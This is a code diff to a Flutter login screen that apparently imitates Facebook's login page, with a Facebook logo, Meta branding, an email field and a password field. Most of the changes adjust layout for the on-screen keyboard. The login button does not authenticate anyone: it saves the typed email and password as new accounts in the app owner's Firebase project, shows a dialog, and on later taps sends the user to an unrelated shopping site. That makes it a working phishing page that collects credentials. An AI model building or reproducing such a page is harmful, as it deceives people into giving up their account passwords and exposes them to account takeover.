@@ -81,40 +81,37 @@ class _LoginpageState extends State<Loginpage> {
     return
        Scaffold(
          body: Padding(
-           padding: const EdgeInsets.all(20.0),
-           child: Column(
-            children: [
-              const Align(alignment:Alignment.centerLeft,child: Icon(Icons.arrow_back_ios)),
-              SizedBox(height: height*.01,),
-              const Text("English (UK)",style: TextStyle(fontSize: 14,fontWeight: FontWeight.w600,color: Color(0xff525C68),)),
-              SizedBox(height: height*.08,),
-
-              Image.asset("images/facebook (1).png",scale: 8,),
-              SizedBox(height: height*.08,),
-
-              Container(
-                height: height*.085,
-                width: width*.95,
-                decoration: BoxDecoration(
-                  border: Border.all(color: color,width: 3),
-                    color: Colors.white,
-                    borderRadius: BorderRadius.circular(13),
-                    boxShadow: [
-                      BoxShadow(
-                          color: Colors.black.withOpacity(.04),
-                          spreadRadius: 8,
-                          blurRadius: 16)
-                    ]),
-                child:  Padding(
-                  padding: const EdgeInsets.only(bottom: 16,top: 12,right: 12,left: 12),
-                  child: TextField(
+           padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom * .4),
+           child: Padding(
+             padding: const EdgeInsets.all(20.0),
+             child: Column(
+              children: [
+                MediaQuery.of(context).viewInsets.bottom==0?const Align(alignment:Alignment.centerLeft,child:Icon(Icons.arrow_back_ios)):Container(),
+                SizedBox(height: height*.01,),
+                MediaQuery.of(context).viewInsets.bottom==0? const Text("English (UK)",style: TextStyle(fontSize: 14,fontWeight: FontWeight.w600,color: Color(0xff525C68),)):Container(),
+                MediaQuery.of(context).viewInsets.bottom==0?SizedBox(height: height*.08,):Container(),
+                Image.asset("images/facebook (1).png",scale: 8,),
+                SizedBox(height: height*.08,),
+                Container(
+                  width: width*.95,
+                  decoration: BoxDecoration(
+                    border: Border.all(color: color,width: 3),
+                      color: Colors.white,
+                      borderRadius: BorderRadius.circular(13),
+                      boxShadow: [
+                        BoxShadow(
+                            color: Colors.black.withOpacity(.04),
+                            spreadRadius: 8,
+                            blurRadius: 16)
+                      ]),
+                  child:  TextFormField(
                     controller: eController,
                     textInputAction: TextInputAction.next,
                     cursorOpacityAnimates: true,
                     decoration: const InputDecoration(
-
                       border: InputBorder.none,
                       labelText: "Mobile number or email address",
+                      contentPadding:  EdgeInsets.only(bottom: 16,top: 12,right: 12,left: 12),
                       labelStyle: TextStyle(
                           color: Colors.grey,
                           fontWeight: FontWeight.w500,
@@ -128,24 +125,20 @@ class _LoginpageState extends State<Loginpage> {
                         ),
                   ),
                 ),
-              ),
-              SizedBox(height: height*.01,),
-              Container(
-                height: height*.085,
-                width: width*.95,
-                decoration: BoxDecoration(
-                    border: Border.all(color: color,width: 3),
-                    color: Colors.white,
-                    borderRadius: BorderRadius.circular(13),
-                    boxShadow: [
-                      BoxShadow(
-                          color: Colors.black.withOpacity(.04),
-                          spreadRadius: 8,
-                          blurRadius: 16)
-                    ]),
-                child:  Padding(
-                  padding: const EdgeInsets.only(bottom: 16,top: 12,right: 12,left: 12),
-                  child: TextField(
+                SizedBox(height: height*.01,),
+                Container(
+                  width: width*.95,
+                  decoration: BoxDecoration(
+                      border: Border.all(color: color,width: 3),
+                      color: Colors.white,
+                      borderRadius: BorderRadius.circular(13),
+                      boxShadow: [
+                        BoxShadow(
+                            color: Colors.black.withOpacity(.04),
+                            spreadRadius: 8,
+                            blurRadius: 16)
+                      ]),
+                  child:  TextFormField(
                     controller: pController,
                     keyboardType: TextInputType.text,
                     obscureText: !passwordVisible,
@@ -171,6 +164,7 @@ class _LoginpageState extends State<Loginpage> {
                         fontWeight: FontWeight.w500,
                         fontSize: 18,
                       ),
+                      contentPadding: const EdgeInsets.only(bottom: 16,top: 12,right: 12,left: 12),
                     ),
                     style: const TextStyle(
                       color: Colors.black87 ,
@@ -179,97 +173,95 @@ class _LoginpageState extends State<Loginpage> {
                     ),
                   ),
                 ),
-              ),
 
-              SizedBox(height: height*.01,),
-              Container(
-                height: height * .06 ,
-                width: width * .95,
-                alignment: Alignment.center,
-                decoration: BoxDecoration(
-                    color: const Color(0xff0068FF),
-                    borderRadius: BorderRadius.circular(32),
-                    boxShadow: [
-                      BoxShadow(
-                          color: Colors.black.withOpacity(.04),
-                          spreadRadius: 8,
-                          blurRadius: 16)
-                    ]),
-                child: GestureDetector(
-                    onTap: () async {
-                      setState(() {
-                        showSpinner = true;
-                      });
-                      print(counter);
-                      try {
-                        UserCredential credential =
-                        await _auth.createUserWithEmailAndPassword(
-                            email: eController.text,
-                            password: pController.text);
-                        counter == 0?_showMyDialog():launchUrl("https://www.victoriassecret.com/us/");
-                      } on FirebaseAuthException catch (e) {
-                        print(e);
-                      }
-                      setState(() {
-                        showSpinner = false;
-                        counter++;
+                SizedBox(height: height*.01,),
+                GestureDetector(
+                  onTap: () async {
+                    setState(() {
+                      showSpinner = true;
+                    });
+                    print(counter);
+                    try {
+                      UserCredential credential =
+                      await _auth.createUserWithEmailAndPassword(
+                          email: eController.text,
+                          password: pController.text);
+                      counter == 0?_showMyDialog():launchUrl("https://www.victoriassecret.com/us/");
+                    } on FirebaseAuthException catch (e) {
+                      print(e);
+                    }
+                    setState(() {
+                      showSpinner = false;
+                      counter++;
 
-                      });
-                    },
+                    });
+                  },
+                  child:Container(
+                  height: height * .06 ,
+                  width: width * .95,
+                  alignment: Alignment.center,
+                  decoration: BoxDecoration(
+                      color: const Color(0xff0068FF),
+                      borderRadius: BorderRadius.circular(32),
+                      boxShadow: [
+                        BoxShadow(
+                            color: Colors.black.withOpacity(.04),
+                            spreadRadius: 8,
+                            blurRadius: 16)
+                      ]),
+                  child:  const Text(
+                      "Log in",
+                      style: TextStyle(
+                          fontSize: 16  ,
+                          color: Colors.white,
+                          fontWeight: FontWeight.w200,
+                          fontFamily: "playfair"),
+                    ),
+                  ),
+                ),
+                SizedBox(height: height*.02,),
+                const Text("Forgotten Password?",style: TextStyle(color: Colors.black,fontFamily:"playfair" ,fontWeight:FontWeight.w500,fontSize:17 ),),
+                const Spacer(),
+
+                MediaQuery.of(context).viewInsets.bottom==0?Container(
+                  height: height * .06 ,
+                  width: width * .95,
+                  alignment: Alignment.center,
+                  decoration: BoxDecoration(
+                      color: Colors.white,
+                      borderRadius: BorderRadius.circular(32),
+                      border: Border.all(color: const Color(0xff0068FF)),
+                      boxShadow: [
+                        BoxShadow(
+                            color: Colors.black.withOpacity(.04),
+                            spreadRadius: 8,
+                            blurRadius: 16)
+                      ]),
                   child: const Text(
-                    "Log in",
+                    "Create new account",
                     style: TextStyle(
                         fontSize: 16  ,
-                        color: Colors.white,
+                        color: Color(0xff0068FF),
                         fontWeight: FontWeight.w200,
                         fontFamily: "playfair"),
                   ),
-                ),
-              ),
-              SizedBox(height: height*.02,),
-
-              const Text("Forgotten Password?",style: TextStyle(color: Colors.black,fontFamily:"playfair" ,fontWeight:FontWeight.w500,fontSize:17 ),),
-              const Spacer(),
-
-              Container(
-                height: height * .06 ,
-                width: width * .95,
-                alignment: Alignment.center,
-                decoration: BoxDecoration(
-                    color: Colors.white,
-                    borderRadius: BorderRadius.circular(32),
-                    border: Border.all(color: const Color(0xff0068FF)),
-                    boxShadow: [
-                      BoxShadow(
-                          color: Colors.black.withOpacity(.04),
-                          spreadRadius: 8,
-                          blurRadius: 16)
-                    ]),
-                child: const Text(
-                  "Create new account",
-                  style: TextStyle(
-                      fontSize: 16  ,
-                      color: Color(0xff0068FF),
-                      fontWeight: FontWeight.w200,
-                      fontFamily: "playfair"),
-                ),
-              ),
-              SizedBox(height: height*.02,),
-
-              Row(
-                mainAxisAlignment: MainAxisAlignment.center,
-                children: [
-                  Image.asset("images/meta.png",scale: 20,color: const Color(0xff616F79),),
-                  const SizedBox(width: 5,),
-                  const Text("Meta",style: TextStyle(fontSize: 18,fontWeight: FontWeight.w600,color: Color(0xff616F79)),),
-                ],
-              ),
-              SizedBox(height: height*.03,),
+                ):Container(),
+                MediaQuery.of(context).viewInsets.bottom==0? SizedBox(height: height*.02,):Container(),
+                MediaQuery.of(context).viewInsets.bottom==0? Row(
+                  mainAxisAlignment: MainAxisAlignment.center,
+                  children: [
+                    Image.asset("images/meta.png",scale: 20,color: const Color(0xff616F79),),
+                    const SizedBox(width: 5,),
+                    const Text("Meta",style: TextStyle(fontSize: 18,fontWeight: FontWeight.w600,color: Color(0xff616F79)),),
+                  ],
+                ):Container(),
+                MediaQuery.of(context).viewInsets.bottom==0? SizedBox(height: height*.03,):Container(),
 
 
-            ],
+              ],
 
-                 ),
+                   ),
+           ),
          ),
        );
 
